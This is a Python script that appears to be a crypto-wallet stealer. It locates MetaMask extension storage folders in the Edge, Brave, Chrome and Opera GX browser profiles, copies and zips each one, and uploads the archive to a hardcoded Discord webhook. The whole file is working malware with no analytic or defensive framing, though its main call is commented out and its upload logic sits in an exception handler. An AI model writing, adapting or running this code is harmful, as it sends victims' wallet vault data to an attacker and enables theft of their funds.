import requests, os, os.path, shutil
user = os.path.expanduser("~")

hook = "https://discord.com/api/webhooks/1090077174641463457/4bnLNsh75UzDAEzk0PsDqdV1R2w9CD32pAjI8jlY93surPEmSwt-PRKZ9mzS-TcQ9FR3"

def make(args, brow, count):
   try:
    if os.path.exists(args):
     shutil.copytree(args, user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
     
     # 
   except:
      # print("erin")
      shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
      file = {"file": open(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip", 'rb')}
      r = requests.post(hook, files=file)
      # print(r.content)
      # os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
      #ArithmeticErroros.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
def yea():
    
 meta_paths = [
   
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",               "Edge"               ],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Edge"               ],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Brave"               ],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",              "Google"               ],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "OperaGX"               ]
    ]
 count = 0
 try:
  for i in meta_paths:
   # print(i)
   make(i[0], brow=i[1], count=count)
   count+=1
 except IndexError:
   # print("errr")
   pass
     
# yea()
